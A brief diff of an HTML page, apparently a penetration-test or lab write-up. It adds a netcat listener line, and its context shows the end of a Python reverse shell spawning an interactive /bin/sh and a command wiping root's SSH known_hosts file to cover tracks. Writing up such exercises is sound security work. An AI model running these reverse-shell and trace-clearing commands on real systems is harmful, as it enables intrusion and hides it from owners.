@@ -203,6 +203,7 @@ os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
       <p>Before exiting, started a listener and cleared known hosts:</p>
       <pre><code>echo "" > /root/.ssh/known_hosts</code></pre>
+      <pre><code>nc -lvnp 1234</code></pre>
     </section>
 
     <section id="root" class="card">
